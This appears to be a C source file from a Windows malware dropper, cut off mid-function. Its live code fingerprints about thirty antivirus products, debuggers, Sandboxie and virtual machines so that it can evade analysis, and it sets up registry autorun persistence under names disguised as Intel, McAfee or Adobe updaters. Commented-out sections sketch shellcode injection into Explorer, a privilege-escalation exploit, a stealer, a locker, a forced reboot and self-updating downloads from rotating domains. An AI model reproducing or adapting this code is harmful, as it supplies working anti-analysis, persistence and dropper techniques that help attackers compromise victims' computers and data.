#include "../../0lib/code/zmodule.h"
#include "common.h"
#include "domains.h"
#include "controller.h"
#include "bundles.h"

/*
#define DROP_EXP_MUTEX_ID    -3
#define DROP_RUN_MUTEX_ID    -1
#define DROP_MACHINEGUID "797iAZ93i1017999"

#include "errors.h"

#include "sc_defines.h"

void dropper_prepare_shellcode(uint8_t* pDescBuffer, const uint8_t* pOrigSc, uint32_t origSize, const uint8_t* pData, uint32_t dataSize);
BOOLEAN dropper_prepare_shellcode_data(uint8_t* imageBase, pstd_shellcode_data pScData, const char* mappingName, const char* funcName, int needTerminate, int is64);

BOOLEAN dropper_infect_victim_dll(LPCWSTR lpcwFileName);

typedef struct _shellcode_data32
{
uint32_t Ret2LibCode[0x20];
uint32_t NewLongVtable[8];
explorer_shellcode_data32 injectData;
uint8_t trueShellCode[1];
} shellcode_data32, *pshellcode_data32;

HANDLE eexp_create_notify_inject_event();
BOOLEAN eexp_notify_parent_and_restore_atan();

DWORD GetMovEdiEspAddress32();
PVOID eexp_create_remote_shellcode32(PVOID CurrentShellCodeData, DWORD Length, DWORD TrueShellCodeSize);
BOOLEAN ConfigureShellCodeData32(HANDLE ProcessHandle, pshellcode_data32 CurrentShellCodeData, pshellcode_data32 RemoteShellCodeData, DWORD Length);
BOOLEAN eexp_get_work_section32(HANDLE *SectionHandle, PVOID *BaseAddress, DWORD *ViewSize);
BOOLEAN eexp_inject32();

typedef struct _shellcode_data64
{
DWORD64 NewLongVtable[8];
union {
DWORD64 Ret2LibCode[0x9A];
struct
{
DWORD64 Ret2LibCode[0x30];
explorer_shellcode_data64 injectData;
uint8_t trueShellCode[1];
} u;
} d;
} shellcode_data64, *pshellcode_data64;

BOOLEAN ConfigureShellCodeData64(HANDLE ProcessHandle, pshellcode_data64 CurrentShellCodeData, DWORD64 RemoteShellCodeData, DWORD Length);
DWORD64 eexp_create_remote_shellcode64(pshellcode_data64 CurrentShellCodeData, DWORD Length, DWORD TrueShellCodeSize);

BOOLEAN eexp_inject64();

PCHAR utils_machine_guid();
DWORD possessor_common_thread(PVOID Context);

*/

#include "ztable.h"

EXTERN_C const IID IID_IFileOperation;
EXTERN_C const IID IID_IShellItem2;
EXTERN_C const CLSID CLSID_FileOperation;
EXTERN_C const IID IID_IShellLinkW;
EXTERN_C const CLSID CLSID_ShellLink;


static const HANDLE _regRoots[] = { NATIVE_KEY_LOCAL_MACHINE, NATIVE_KEY_CURRENT_USER };
const wchar_t* const _vendors[] = { L"Intel", L"Dell", L"Google", L"Sun", L"Skype", L"McAfee", L"Symantec", L"Nvidia", L"Apple", L"Adobe", L"Mozilla", L"Windows", NULL };
const wchar_t* const _autorunSuffixes[] = { L"Update", L" AutoUpdater", L" Trusted Service", L" Security Service", L" Host Security", L" COM Helper", L"Diagnostics", L"Svc", L" SystemHost", L" Monitor", L"Broker", NULL };
static const char* const _fnameSuffixes[] = { "udp", "updater", "trust", "secsvc", "shost", "comhlp", "diag", "svc", "syshost", "mon", "broker"};

const wchar_t* _regAutorunPaths[] = {
	L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
	L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
	//  L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
	//  L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
};

zmodule_block_t _zmoduleBlock = { 0 };
zmodule_block_t* _pZmoduleBlock = &_zmoduleBlock;
HANDLE _hCommonThread;
HANDLE _mutexHandle = NULL; // ���������� ����������� �������.
vector_t _paths; // ������ ���������� �����.


int __stdcall environment_check_hipses()
{
    int ret = 0;
    PSYSTEM_PROCESS_INFORMATION pProcess;
    uint64_t hipsMask = 0ULL;

    LOG("Checking for HIPSes...");

    pProcess = NATIVE_FIRST_PROCESS(_pZmoduleBlock->processes);
    do {
        if (pProcess->ImageName.Length > 0) {
            uint32_t hashVal = utils_wcsihash(pProcess->ImageName.Buffer);
            LOG("Checking process %S (PID = %u; NameHash = 0x%08X)", pProcess->ImageName.Buffer, (uint32_t)pProcess->UniqueProcessId, hashVal);
            switch (hashVal) {
            case EKRN_EXE_HASH:
                hipsMask |= HIPS_ESET;
                LOG("ESET detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case CCSVCHST_EXE_HASH:
                hipsMask |= HIPS_SYMANTEC;
                LOG("Symantec detected(PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case SCHED_EXE_HASH:
                hipsMask |= HIPS_AVIRA;
                LOG("Avira detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case AVP_EXE_HASH:
                hipsMask |= HIPS_KASPERSKY;
                LOG("KAV detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case AVASTSVC_EXE_HASH:
                hipsMask |= HIPS_AVAST;
                LOG("Avast detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case MCSVHOST_EXE_HASH:
                hipsMask |= HIPS_MCAFEE;
                LOG("McAfee detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case CMDAGENT_EXE_HASH:
                hipsMask |= HIPS_COMODO;
                LOG("COMODO detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case AVGWDSVC_EXE_HASH:
            case AVGCSRVX_EXE_HASH:
                hipsMask |= HIPS_AVG;
                LOG("AVG detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case ACS_EXE_HASH:
                hipsMask |= HIPS_OUTPOST;
                LOG("Outpost detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case DWSERVICE_EXE_HASH:
                hipsMask |= HIPS_DRWEB;
                LOG("Dr.Web detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case PFSVC_EXE_HASH:
                hipsMask |= HIPS_PRIVATEFW;
                LOG("PrivateFirewall detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case MSMPENG_EXE_HASH:
            case MSSECES_EXE_HASH:
                hipsMask |= HIPS_MSE;
                LOG("MSE detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case ISWSVC_EXE_HASH:
                hipsMask |= HIPS_ZONEALARM;
                LOG("ZoneAlarm detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case PCTSSVC_EXE_HASH:
                hipsMask |= HIPS_PCTOOLS;
                LOG("PC Tools detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case JPF_EXE_HASH:
                hipsMask |= HIPS_JETICO;
                LOG("Jetico detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case BDAGENT_EXE_HASH:
                hipsMask |= HIPS_BDEFENDER;
                LOG("BitDefender detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case ADAWARESERVICE_EXE_HASH:
                hipsMask |= HIPS_ADAWARE;
                LOG("Ad-Aware detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case ARCAMAINSV_EXE_HASH:
                hipsMask |= HIPS_ARCAVIR;
                LOG("ArcaVir detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case PSCTRLS_EXE_HASH:
                hipsMask |= HIPS_PANDA;
                LOG("Panda detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case SAVSERVICE_EXE_HASH:
            case SAVADMINSERVICE_EXE_HASH:
                hipsMask |= HIPS_SOPHOS;
                LOG("Sophos detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case FSHOSTER32_EXE_HASH:
                hipsMask |= HIPS_FSECURE;
                LOG("F-Secure detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case TPMGMA_EXE_HASH:
                hipsMask |= HIPS_TRUSTPORT;
                LOG("TrustPort detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case NPSVC32_EXE_HASH:
                hipsMask |= HIPS_NORMAN;
                LOG("Norman detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case INORT_EXE_HASH:
                hipsMask |= HIPS_ETRUST;
                LOG("eTrust detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case RSMGRSVC_EXE_HASH:
                hipsMask |= HIPS_RISING;
                LOG("Rising detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case GUARDXSERVICE_EXE_HASH:
                hipsMask |= HIPS_IKARUS;
                LOG("IKARUS detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case SOLOSENT_EXE_HASH:
            case SOLOCFG_EXE_HASH:
                hipsMask |= HIPS_SOLO;
                LOG("SoloAV detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case TFSERVICE_EXE_HASH:
                hipsMask |= HIPS_THREATFIRE;
                LOG("ThreatFire detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case BULLGUARDBHVSCANNER_EXE_HASH:
                hipsMask |= HIPS_BULLGUARD;
                LOG("BullGuard detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case CORESERVICESHELL_EXE_HASH:
                hipsMask |= HIPS_TRENDMICRO;
                LOG("TrendMicro detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case K7TSMNGR_EXE_HASH:
                hipsMask |= HIPS_K7;
                LOG("K7 detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            case SBAMSVC_EXE_HASH:
            case INSSATT_EXE_HASH:
                hipsMask |= HIPS_VIPRE;
                LOG("Vipre detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                break;
            }
        }
    } while (pProcess = NATIVE_NEXT_PROCESS(pProcess));

    if (hipsMask == 0ULL) {
        hipsMask = HIPS_MAX_VALUE;
        LOG("HIPSes not detected!");
    }
    else {
        ret = 1;
    }

    _pZmoduleBlock->hipsMask = hipsMask;

    return ret;
}


/*
typedef int (*FnDetector)();


int detect_check_device(const wchar_t* wPath)
{
int ret = 0;
HANDLE hDevice = fn_CreateFileW(wPath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

// in testing in some cases it never succeeds to open it (but device is present we get ERROR_SEEK)
// in general i think anything other than ERROR_FILE_NOT_FOUND/ERROR_PATH_NOT_FOUND
// is indication that we've got something
if(hDevice != INVALID_HANDLE_VALUE) {
fn_CloseHandle(hDevice);
ret = 1;
}
else {
int nError = fn_GetLastError();
ret = (nError != ERROR_PATH_NOT_FOUND && nError != ERROR_FILE_NOT_FOUND) ? 1 : 0;
}
return ret;
}

int detect_vmware()
{
// VMware named events:
// WMToolsWindowEvent, WMToolsHookQueueEvent, WMwareCopyPasteDataTransfer, WMwareCopyPasteSetClipboard
// WMwareDnDDataTransfer, WMwareToolsDumpStateEvent_wmsvc, WMwareToolsQuitEvent_wmsvc, WMwareUserManagerEvent

// WMware mutexes:
// WMToolsHookQueueLock, WMwareGuestCopyPasteMutex, WMwareGuestDnDDataMutex

// driver: hgfs.sys, vmci.sys
// hgfs.sys (file name might be vmhgfs.sys too?) is used for shared folders
// vmci.sys used for vm's communication with host/other vms
const wchar_t* hgfs = L"\\\\.\\HGFS";
const wchar_t* vmci1 = L"\\\\.\\vmci";
const wchar_t* vmci2 = L"\\\\.\\VMCIDev";

int ret = detect_check_device(hgfs);
if (ret == 0) {
ret = detect_check_device(vmci1);
if (ret == 0) {
ret = detect_check_device(vmci2);
}
}
return ret;
}

int detect_vbox()
{
const wchar_t* vbox = L"\\\\.\\VBoxGuest";
return detect_check_device(vbox);
}


// int detect_virtual_machine()
// {
//     int i;
//     FnDetector fnDetectors[] = {detect_vmware, detect_vbox};
//
//     for (i = 0; i < sizeof(fnDetectors) / sizeof(FnDetector); ++i) {
//         if (fnDetectors[i]()) {
//             return 1;
//         }
//     }
//
//     return 0; // all checks passed
// }

int detect_registry_exists_key(HKEY hKey, const wchar_t* subKey)
{
HKEY hSubKey;
DWORD result;

if (fn_RegCreateKeyExW(hKey, subKey, 0, 0, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WOW64_32KEY, 0, &hSubKey, &result) != ERROR_SUCCESS) {
if (fn_RegCreateKeyExW(hKey, subKey, 0, 0, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WOW64_64KEY, 0, &hSubKey, &result) != ERROR_SUCCESS) {
return 0;
}
}
return 1;
}

int detect_wine()
{
// WINE detect
// by HKLM\\Software\\Wine or HKCU\\Software\\Wine
const wchar_t* wine = L"Software\\WINE";

if (!detect_registry_exists_key(HKEY_CURRENT_USER, wine)) {
return detect_registry_exists_key(HKEY_LOCAL_MACHINE, wine);
}

return 1;
}

int detect_anubis()
{
const wchar_t* f1 = L"C:\\popupkiller.exe";
return detect_check_device(f1);
}

int detect_comodo_camas()
{
const wchar_t* file = L"C:\\TOOLS\\execute.exe";
return detect_check_device(file);
}


int detect_check_mutex(const char* mutexName)
{
int ret = 0;
HANDLE hMutex = fn_CreateMutexA(NULL, FALSE, mutexName);
if (hMutex != 0) { // opened mutex, check if it was existing
ret = (fn_GetLastError() == ERROR_ALREADY_EXISTS) ? 1 : 0;
fn_CloseHandle(hMutex);
}
else { // couldnt open mutex, see if it's because of limited rights
ret = (fn_GetLastError() == ERROR_ACCESS_DENIED) ? 1 : 0;
}

return ret;
}

int detect_deep_freeze()
{
// Deep Freeze
// processes: FrzState2k.exe, DFServ.exe
// driver: deepfrz.sys
// mutex: Frz_State
const char* mutex_name = "Frz_State";
return detect_check_mutex(mutex_name);
}

int detect_wireshark()
{
// Wireshark Detect
// process wireshark.exe, dumpcap.exe when wireshark is active/capturing
// npf.sys winpcap driver (used with wireshark, maybe other similar soft)

// try opening \\.\NPF_NdisWanIp, it's a device created by npf.sys
const wchar_t* device = L"\\\\.\\NPF_NdisWanIp";
return detect_check_device(device);
}
*/


int __stdcall environment_check_debuffer()
{
    if (fn_IsDebuggerPresent()) {
        LOG("Debugger detected: IsDebuggerPresent");
        return 1;
    }

    LOG("Debugger not detected");

    return 0;
}

int __stdcall environment_check_sandbox()
{
    LOG("Checking for Sandboxes...");

    // Sanboxie...
    if (fn_GetModuleHandleW(L"sbiedll.dll") != NULL) {
        LOG("Sandboxie detected by presence sbiedll.dll");
        return 1;
    }

    LOG("Sandbox not detected");
    return 0;
}


// ���������� � ������ �����.
struct _wmi_diskdrive_info
{
    wchar_t* Caption;
    wchar_t* Model;
} wmiDiskDriveInfo;

wmi_class_property_t diskDriveProps[] = {
        { 'S', &wmiDiskDriveInfo.Caption, L"Caption" },
        { 'S', &wmiDiskDriveInfo.Model, L"Model" },
        { 0, NULL, NULL }
};


int __stdcall diskDriveHandler(wmi_class_info_t* pInstance)
{
    struct _wmi_diskdrive_info* pStruct = (struct _wmi_diskdrive_info*) pInstance->pStruct;
    int ret = 1;
    do {
        LOG("Checking disk drive info: caption - %S; model - %S...", pStruct->Caption, pStruct->Model);
        if (fn_StrStrIW(pStruct->Caption, L"vbox") != NULL || fn_StrStrIW(pStruct->Model, L"vbox") != NULL) {
            LOG("VBox detected (wmi)");
            break;
        }
        else if (fn_StrStrIW(pStruct->Caption, L"vmware") != NULL || fn_StrStrIW(pStruct->Model, L"vmware") != NULL) {
            LOG("VMware detected (wmi)");
            break;
        }
        else if (fn_StrStrIW(pStruct->Caption, L"qemu") != NULL || fn_StrStrIW(pStruct->Model, L"qemu") != NULL) {
            LOG("QEMU detected (wmi)");
            break;
        }
        ret = 0;
    } while (0);
    return ret;
}

int __stdcall environment_check_vm_in_registry(const wchar_t* regPath, const wchar_t* regKey, const wchar_t* matchStr)
{
    int ret = 0;
    wchar_t* wcsValue = native_complete_query_registry_string(NATIVE_KEY_LOCAL_MACHINE, KEY_READ | KEY_WOW64_32KEY, regPath, regKey);
    if (wcsValue == NULL) {
        wcsValue = native_complete_query_registry_string(NATIVE_KEY_LOCAL_MACHINE, KEY_READ | KEY_WOW64_64KEY, regPath, regKey);
    }

    if (wcsValue != NULL) {
        LOG("Checking registry key %S\\%S = %S...", regPath, regKey, wcsValue);
        if (fn_StrStrIW(wcsValue, matchStr) != NULL) {
            ret = 1;
        }
        zs_free(wcsValue);
    }

    return ret;
}

int __stdcall environment_check_vm()
{
    PSYSTEM_PROCESS_INFORMATION pProcess;
    IDispatch* pWmiService;
    //NTSTATUS ntStatus;
    LOG("Checking for VMs...");

    pProcess = NATIVE_FIRST_PROCESS(_pZmoduleBlock->processes);
    do {
        if (pProcess->ImageName.Length > 0) {
            uint32_t hashVal = utils_wcsihash(pProcess->ImageName.Buffer);
            LOG("Checking process %S (PID = %u; NameHash = 0x%08X)", pProcess->ImageName.Buffer, (uint32_t)pProcess->UniqueProcessId, hashVal);
            switch (hashVal) {
            case VBOXSERVICE_EXE_HASH:
            case VBOXTRAY_EXE_HASH:
                LOG("VBox detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                return 1;
            case VMACTHLP_EXE_HASH:
            case VMTOOLSD_EXE_HASH:
                LOG("VMware detected (PID: %u)", (uint32_t)pProcess->UniqueProcessId);
                return 1;
            }
        }
    } while (pProcess = NATIVE_NEXT_PROCESS(pProcess));

    if (environment_check_vm_in_registry(L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", L"Identifier", L"vbox") ||
        environment_check_vm_in_registry(L"HARDWARE\\Description\\System", L"SystemBiosVersion", L"vbox") ||
        environment_check_vm_in_registry(L"HARDWARE\\Description\\System", L"SystemBiosVersion", L"virtualbox") ||
        environment_check_vm_in_registry(L"SOFTWARE\\Oracle\\VirtualBox Guest Additions", L"InstallDir", L"virtualbox")) {
        LOG("VBox detected");
        return 1;
    }
    // ����� ����� ������������ �������� �� ����� � C:\Windows\System32\Drivers\:
    // VboxGuest.sys, VboxMouse.sys, VboxSF.sys, VboxVideo.sys

    if (environment_check_vm_in_registry(L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", L"Identifier", L"vmware") ||
        environment_check_vm_in_registry(L"SOFTWARE\\VMware, Inc.\\VMware Tools", L"InstallDir", L"vmware")) {
        LOG("VMware detected");
        return 1;
    }
    // ����� ����� ������������ �������� �� ����� � C:\Windows\System32\Drivers\:
    // vmmouse.sys, vmhgfs.sys, vmx_svga.sys, vmxnet.sys, vmscsi.sys

    if (environment_check_vm_in_registry(L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", L"Identifier", L"qemu") ||
        environment_check_vm_in_registry(L"HARDWARE\\Description\\System", L"SystemBiosVersion", L"qemu")) {
        LOG("QEMU detected");
        return 1;
    }

    pWmiService = wmi_get_service(L"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");

    if (pWmiService != NULL) {
        wmi_class_info_t diskDrive = { L"Win32_DiskDrive", &wmiDiskDriveInfo, sizeof(wmiDiskDriveInfo), diskDriveHandler, diskDriveProps };
        if (wmi_obtain_info(pWmiService, &diskDrive)) {
            pWmiService->lpVtbl->Release(pWmiService);
            return 1;
        }

        pWmiService->lpVtbl->Release(pWmiService);
    }
    else {
        LOG("Failed to obtain the WMI service");
    }

    LOG("VM not detected");

    // Software\Microsoft\Windows\CurrentVersion - ProductId
    // 76487-337-8429955-22614 - Anubis
    // 76487-640-1457236-23125 - Anubis
    // 76487-644-3177037-23510 - CWSandbox
    // 55274-640-2673064-23950 - JoeBox

    // dllname: dbghelp.dll - ThreatExpert
    // dllname: sbiedll.dll - Sandboxie
    // dllname: api_log.dll - SunBelt Sanbox
    // dllname: dir_watch.dll - Sulbelt Sandbox

    // Processes:
    // joeboxcontrol.exe //JoeBox
    // joeboxserver.exe //Joebox 2
    // sandbox.exe 
    // sandboxreboot.exe
    // sandboxreboot-5min.exe

    // HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion
    // Registered Owner = SandBox

    // Norman Sandbox ??
    //CWSandbox aka GFISandbox aka SynbeltSandbox:
    //C:\76063577.exe
    //C:\76063569.exe
    //C:\76063557.exe

    //Anubis:
    //C:\sample.exe
    //C:\0bea8a464b.exe
    //C:\ba1d8f958f.exe
    //C:\0020473293.exe
    //C:\0020447873.exe
    //C:\0020552675.exe
    //C:\09073e61ef.exe
    //C:\f13d4c4215.exe

    //Norman Sandbox:
    //d:\nad\temp\0\58e3b1354ae1d0506baa15375efc8e21.bin
    //d:\nad\temp\1\94e2510fc1d111445da26b2becda8e98.bin
    //d:\nad\temp\0\d42e3ee4b1e5336a9404a6962cb795c1.bin
    //d:\nad\temp\0\d42e3ee4b1e5336a9404a6962cb795c1.bin
    //d:\nad\temp\1\dc2f06e94d2c39ee6c10d82477e02b61.bin
    //C:\analyzer\scan\2762394d48933f17e4aac7fd45d0918c
    //C:\analyzer\scan\655e7bf0e3092ca7ab3bfbf3b61adbd9

    // Comodo Instant Malware Analysis - camas.comodo.com
    // ThreatExpert                    - www.threatexpert.com
    // JoeBox                          - www.joebox.ch
    // CWSandbox aka SophosSandbox     - www.sunbeltsecurity.com/sandbox/
    // Norman Sandbox                  - www.norman.com/security_center/security_tools/
    // Anubis                          - anubis.iseclab.org
    /*
    FnDetector detect_procs[] = {detect_anubis, detect_comodo_camas, detect_sandboxie, detect_deep_freeze, detect_wireshark,
    detect_vmware, detect_vbox,
    detect_wine};

    for (i = 0; i < sizeof(detect_procs) / sizeof(FnDetector); ++i) {
    if(detect_procs[i]()) {
    return 1;
    }
    }
    */
    return 0; // ��� �������� ������ �� ����������.
}



char* __stdcall possessor_get_pipe_name(uint32_t hashVal)
{
    char pipeName[64];
    fn__snprintf(pipeName, 64, "\\\\.\\pipe\\%x%.8s", CONTROLLER_HASH, _pZmoduleBlock->machineGuid);
    return utils_strdup(pipeName);
}

//#include "../../shared/arc4.c"
//#include "utils.h"

//#include "peldr.h"
//#include "x64utils.h"

//#ifndef _WIN64
//#include "../../shared/hde/hde32.h"
//#endif // _WIN64

//#pragma comment(linker, "/MERGE:.rdata=.data")
//#pragma comment(linker, "/MERGE:.reloc=.text")

// #ifdef _WIN64
// void restore_after_bad_instruction();
// #endif // _WIN64

/*
uint8_t valid_memory[64] = {0};
LONG WINAPI VectoredHandlerX(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
#ifdef _WIN64
        ExceptionInfo->ContextRecord->Rax = (DWORD64)valid_memory;
#else
        ExceptionInfo->ContextRecord->Eax = (DWORD)valid_memory;
#endif // _WIN64
        return EXCEPTION_CONTINUE_EXECUTION;
    }
// #ifdef _WIN64
//     else if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
//         ExceptionInfo->ContextRecord->Rip = restore_after_bad_instruction;
//         return EXCEPTION_CONTINUE_EXECUTION;
//     }
// #endif // _WIN64
    return EXCEPTION_CONTINUE_SEARCH;
}
*/
//#endif // _WIN64
//#include "ms10_092.h"

//#include "../../0kit/mod_shared/zerokit.h"

//#include "../../shared/crc64.h"
//#include "../../shared/crc64.c"
/*
// x64 additional linker option: ..\bin\release64\sysret_trigger.obj
HANDLE ghLockFile = NULL;
HANDLE ghLockerLockFile = NULL;
//wchar_t g_tmpPath[sizeof(exploit_startup_header_t)] = {0};
PVOID currentImageBase = NULL;
DWORD currentImageSize = 0;
PVOID gpModuleBuffer = NULL;
DWORD gModuleSize = 0;
PVOID gpLockerBuffer = NULL;
DWORD gLockerSize = 0;
BOOLEAN bFirstImageLoad = 0;

int gDropperFinished = 0;
int gShouldCallExitProcess = 0;
HANDLE ghPayloadMapping = NULL;
uint8_t* gPayload = NULL;
uint8_t* gLevel1Shellcode = NULL;
*/

//zmodule_block_t zmoduleBlock = {0};
//pzmodule_block_t pZModuleBlock = 0;// &zmoduleBlock;
//payload_info_t payloadInfo = {0};

//static const char cb64[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

//#include "../../shared/debug.c"
//#include "../../shared/utils.c"
//#include "../../shared/zmodules/dynfuncs.c"
//#ifndef _WIN64
//#include "../../shared/hde/hde32.c"
//#endif // _WIN64
//#include "peldr.c"
//#include "x64utils.c"
//#include "utils.c"
/*
#ifdef HYBRID_EXE_PART
#include "explorerexp.c"
#endif // HYBRID_EXE_PART

// #include "com_elevation.c"
// #ifndef _WIN64
// #include "exploits.c"
// #endif // _WIN64
#include "raw_disk.c"
//#include "bootkit.c"
#ifndef _WIN64
#ifdef HIPS_DETECTION
#include "hipshijacks\hips.c"
#endif // HIPS_DETECTION
#endif // _WIN64
#include "httpclient.c"
#include "hipsinfo.c"
#include "env_detector.c"
#include "servercomm.c"
*/
//#pragma intrinsic (_InterlockedIncrement)
/*
#if !defined(_WIN64)
#include "payloadData.h"
#endif // _WIN64

#ifdef _WIN64
wchar_t* gStealerName = L"52F298BF64";
#else
wchar_t* gStealerName = L"52F298BF32"; // hash from 'stealer'
#endif // _WIN64

*/

//#include "../../shared/zmodules/zmodule.c"


/*
void dropper_reboot_with_delay(uint32_t delay)
{
    HANDLE hToken;
    // ������������ ����������� ����������.
    if (fn_OpenProcessToken(NtCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        if (set_priveleges(hToken, "SeShutdownPrivilege")) {
            fn_Sleep(delay);
            fn_ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED | SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_SECURITYFIX);
        }

        fn_CloseHandle(hToken);
    }
}

void dropper_get_local_locker_path()
{
    wchar_t hashName[64];

    fn_wnsprintfW(hashName, sizeof(hashName)/ sizeof(wchar_t), L"%.8S.%x", gMachineGuid, utils_wcshash(gLockerName));
    fn_PathCombineW(pThis->modulePath, pThis->modulePath, hashName);
}

void dropper_load_local_locker_module()
{
    dropper_get_local_locker_path();
    gpLockerBuffer = utils_file_read(pThis->targetPathName, &gLockerSize);
    ghLockFile = utils_file_lock(pThis->modulePathName, GENERIC_READ, OPEN_EXISTING);
}


int gAlreadyInstalled = 0;
// 
// int dropper_request_to_server(const wchar_t* method, wchar_t* name, uint8_t* pBuffer, uint32_t* pSize)
// {
//     wchar_t domain[128];
//     int ret = 0;
//     int i;
// 
//     for (i = 0; !ret && i < URL_COUNT; ++i) {
//         httpclient_t httpClient;
//         if (i > 0) {
//             fn_Sleep(3000);
//         }
//         fn_lstrcpyW(domain, dropper_get_next_domain());
//         fn_lstrcatW(domain, name);
// 
//         httpclient_init(&httpClient, method, domain);
//         ret = httpclient_send_request(&httpClient);
//         if (ret && (httpClient.responseByteCountReceived == httpClient.responseByteCount)) {
//             pBuffer = httpClient.pResponse;
//             *pSize = httpClient.responseByteCount;
//         }
//         httpclient_done(&httpClient);
//     }
// 
//     return ret;
// 
// 
//     bool ret = 0;
//     int totalDomains = ELockerConfig::getInstance()->urls.size();
// 
//     for (int counter = totalDomains; --counter >= 0; ) {
//         for (int i = 0; i < attempts; ++i) {
//             if (makeTransaction(reqType)) {
//                 ret = true;
//                 break;
//             }
//             if ((i + 1) < attempts) {
//                 zgui::Thread::sleep(failTimeout * 1000);
//             }
//         }
// 
//         if (ret == true || (counter == (totalDomains - 1) && onlyFirstDomain)) {
//             break;
//         }
// 
//         nextHost();
//         zgui::Thread::sleep(failTimeout * 1000);
//     }
//     return ret;
// }

// int dropper_wait_util_shutdown(int timeout)
// {
//     int remainTimeout;
//     remainTimeout = timeout;
//     while (remainTimeout > 0) {
//         if (globalData.dropperFinished) {
//             return 1;
//         }
//         remainTimeout -= 1000;
//         fn_Sleep(1000);
//     }
// 
//     return 0;
// }
// 
// DWORD dropper_self_update(void* pParam)
// {
// #define MAX_ATTEMPTS 3
//     DWORD currSize;
//     DWORD remoteSize;
//     int counter;
//     int ret;
//     WIN32_FILE_ATTRIBUTE_DATA fAttrData;
//     wchar_t realDropperName[MAX_PATH];
// 
//     fn_wsprintfW(realDropperName, L"%s%d%d", gDropperName, BUILD_ID, SUB_ID);
// 
//     while (1) {
//         while (pThis->modulePathName[0] == L'\0') {
//             if (dropper_wait_util_shutdown(3000)) {
//                 return 0;
//             }
//         }
//         for (counter = 0, currSize = 0; !fn_GetFileAttributesExW(pThis->modulePathName, GetFileExInfoStandard, &fAttrData) && counter < MAX_ATTEMPTS; ++counter) {
//             if (dropper_wait_util_shutdown(7 * 1000)) {
//                 return 0;
//             }
//         }
//         if (counter >= MAX_ATTEMPTS) {
//             if (dropper_wait_util_shutdown(7 * 60 * 1000)) {
//                 break;
//             }            
//             continue;
//         }
//         currSize = fAttrData.nFileSizeLow;
// 
//         // ��������� �� ������������� ����������.
//         for (counter = 0, remoteSize = 0; (ret = dropper_request_to_server(L"HEAD", realDropperName, NULL, &remoteSize)) == 0 && counter < MAX_ATTEMPTS; ++counter) {
//             if (dropper_wait_util_shutdown(7 * 1000)) {
//                 return 0;
//             }
//         }
//         if (ret == 200) {
//             if (remoteSize > 0 && currSize != remoteSize) {
//                 uint8_t* pBuffer = utils_malloc(1024 * 1024);
//                 
//                 for (counter = 0; (ret = dropper_request_to_server(L"GET", realDropperName, pBuffer, &remoteSize)) == 0 && remoteSize > 0 && counter < MAX_ATTEMPTS; ++counter) {
//                     if (dropper_wait_util_shutdown(70 * 1000)) {
//                         utils_free(pBuffer);
//                         return 0;
//                     }
//                 }
// 
//                 if (ret == 200 && remoteSize > 0) {
//                     if (globalData.hLockFile != NULL) {
